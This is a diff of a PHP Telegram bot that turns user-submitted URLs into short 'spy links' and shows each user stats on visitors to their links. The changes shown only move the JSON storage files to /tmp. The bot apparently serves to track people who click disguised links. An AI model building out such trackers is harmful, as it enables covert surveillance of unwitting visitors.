@@ -5,8 +5,8 @@ $botToken = $config['bot_token'];
 $website = $config['website'];
 
 // Create files if not exist
-if (!file_exists("links.json")) {
-    file_put_contents("links.json", json_encode([]));
+if (!file_exists("/tmp/links.json")) {
+    file_put_contents("/tmp/links.json", json_encode([]));
 }
 
 $content = file_get_contents("php://input");
@@ -37,7 +37,7 @@ if ($callback && $callback["data"] == "generate") {
 
 // Stats button
 if ($callback && $callback["data"] == "stats") {
-    $allVisitors = json_decode(file_get_contents("visitors.json"), true) ?? [];
+    $allVisitors = json_decode(file_get_contents("/tmp/visitors.json"), true) ?? [];
     $myVisitors = [];
     
     foreach ($allVisitors as $id => $data) {
@@ -59,13 +59,13 @@ if ($text && filter_var($text, FILTER_VALIDATE_URL)) {
     $shortCode = $domain . '_' . substr(time(), -4);
     
     // Save target URL with user's chat ID
-    $db = json_decode(file_get_contents("links.json"), true) ?? [];
+    $db = json_decode(file_get_contents("/tmp/links.json"), true) ?? [];
     $db[$shortCode] = [
         'url' => $text,
         'created_by' => $chatId,
         'created_at' => date('Y-m-d H:i:s')
     ];
-    file_put_contents("links.json", json_encode($db));
+    file_put_contents("/tmp/links.json", json_encode($db));
     
     $spyLink = $website . $shortCode;
     
